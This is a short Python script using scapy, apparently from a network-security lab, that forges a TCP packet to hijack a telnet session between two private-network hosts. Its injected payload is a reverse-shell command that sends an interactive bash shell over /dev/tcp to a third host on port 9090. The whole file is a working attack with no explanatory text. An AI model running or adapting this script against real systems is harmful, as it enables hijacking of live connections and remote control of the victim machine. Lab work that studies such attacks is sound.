#!use/bin/python3
from scapy.all import *
import sys

s_port = 51010
sequence = 1124682152
acknoledgment = 2394522138

print("Sending Session Hijacking Packet..")
ip = IP(src='10.0.2.8',dst='10.0.2.9')
tcp = TCP(sport=s_port,dport=23,flags="A",seq=sequence,ack=acknoledgment)
payload = "\r/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1\r"
pkt=ip/tcp/payload
pkt.show()
send(pkt,verbose=0)